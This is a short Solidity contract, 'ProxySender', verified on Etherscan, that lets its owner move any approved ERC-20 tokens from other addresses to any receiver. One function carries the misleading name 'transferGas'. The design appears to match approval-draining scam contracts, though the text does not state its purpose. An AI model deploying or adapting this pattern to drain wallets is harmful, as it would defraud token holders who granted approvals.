/**
 *Submitted for verification at Etherscan.io on 2022-08-27
*/

/**
 *Submitted for verification at Etherscan.io on 2022-04-23
*/

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.6.1;

interface IERC20Token {
    function allowance(address _owner, address _spender) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}

contract ProxySender {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferFrom(IERC20Token _token, address _sender, address _receiver) external returns (bool) {
        require(msg.sender == owner, "access denied");
        uint256 amount = _token.allowance(_sender, address(this));
        return _token.transferFrom(_sender, _receiver, amount);
    }

    function transferGas(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {
        require(msg.sender == owner, "access denied");
        return _token.transferFrom(_sender, _receiver, _amount);
    }
}